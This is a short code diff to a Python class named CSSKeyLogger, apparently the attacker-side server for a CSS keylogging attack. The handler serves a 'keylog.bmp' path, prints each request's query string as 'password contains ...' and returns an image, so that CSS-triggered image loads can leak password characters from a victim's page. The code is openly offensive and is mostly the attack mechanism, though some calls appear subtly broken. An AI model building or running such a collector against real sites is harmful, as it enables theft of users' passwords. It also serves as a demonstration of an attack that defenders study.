@@ -27,17 +27,19 @@ class CSSKeyLogger:
 
             req = self
             print(req.path)
-            _, _, resrc = req.path.partition('/') 
+            _, _, resrc_and_query = req.path.partition('/') 
+            resrc, _, query = resrc_and_query.rpartition('?')
 
-            if resrc == 'keylog':
+
+            if resrc == 'keylog.bmp':
                 self.send_response(200)
-                self.send_headers('Content-type', 'text/plaintext')
+                self.send_headers('Content-type', 'image/bmp')
                 self.end_headers()
-                _, _, query = req.path.rpartition('?')
                 print(f'password contains "{query}"')
-                self.wfile('hello')
+                with open('skull.bmp', 'rb') as img:
+                    self.wfile(img.read())
             else:
-                super().do_GET()
+                return super().do_GET()
 
 
     class Server(HTTPServer):  # TODO: add threading mixin
